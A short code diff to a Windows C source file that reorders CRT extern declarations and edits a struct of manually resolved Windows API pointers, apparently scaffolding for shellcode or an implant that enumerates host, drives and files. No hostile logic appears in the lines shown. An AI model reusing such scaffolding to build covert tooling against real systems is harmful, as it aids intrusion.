@@ -5,13 +5,13 @@
 #include <psapi.h>
 #include "ntdll.h"
 
-extern void* __cdecl memset(void*, int, size_t);
-extern void* __cdecl memcpy(void*, const void*, size_t);
-
 #define TEB NtCurrentTeb()
 #define DECL_API(x) decltype(x) * x
 
 typedef int (*vsnprintf_t)(char* str, size_t size, const char* format, va_list args);
+
+extern void* __cdecl memset(void*, int, size_t);
+extern void* __cdecl memcpy(void*, const void*, size_t);
 
 struct WINAPIFUNC
 {
@@ -25,6 +25,7 @@ struct WINAPIFUNC
 	DECL_API(FindClose);
 	DECL_API(FindFirstFileA);
 	DECL_API(FindNextFileA);
+	DECL_API(FreeLibrary);
 	DECL_API(GetACP);
 	DECL_API(GetComputerNameExA);
 	DECL_API(GetCurrentDirectoryA);
@@ -34,10 +35,11 @@ struct WINAPIFUNC
 	DECL_API(GetFileSize);
 	DECL_API(GetFileAttributesA);
 	DECL_API(GetFullPathNameA);
+	DECL_API(GetLastError);
 	DECL_API(GetLogicalDrives);
 	DECL_API(GetOEMCP);
 	DECL_API(GetModuleBaseNameA);
-	DECL_API(GetModuleHandleW);
+	DECL_API(GetModuleHandleA);
 	DECL_API(GetProcAddress);
 	DECL_API(GetTickCount);
 	//DECL_API(GetTokenInformation);
